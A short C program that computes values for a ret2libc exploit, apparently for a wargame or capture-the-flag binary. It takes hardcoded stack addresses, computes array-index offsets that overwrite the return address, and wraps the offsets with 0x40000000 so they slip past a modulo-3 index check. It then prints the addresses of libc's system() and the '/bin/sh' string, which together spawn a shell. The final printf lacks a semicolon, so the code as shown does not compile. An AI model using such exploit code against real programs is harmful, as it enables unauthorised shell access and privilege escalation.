#include <stdio.h>

int main() {
	unsigned int ret_addr = 0xffffd70c;
	unsigned int bin_sh = ret_addr + 0x8;
	unsigned int array_begin = 0xffffd544;

	unsigned int offset_ret = (ret_addr - array_begin) / 4;
	unsigned int bin_sh_offset = (bin_sh - array_begin) / 4;

	while (offset_ret % 3 == 0) {
		offset_ret += 0x40000000;
	}
	while (bin_sh_offset % 3 == 0) {
		bin_sh_offset += 0x40000000;
	}
	printf("offset ret = %#x %u\n", offset_ret, offset_ret);
	printf("system offset = %u\n", 0xf7e2c000 + 0x3eed0);
	printf("bin_sh argument = %#x %u\n", bin_sh_offset, bin_sh_offset);
	printf("bin_sh string offset = %u\n", 0xf7e2c000 + 0x15d7ec)
}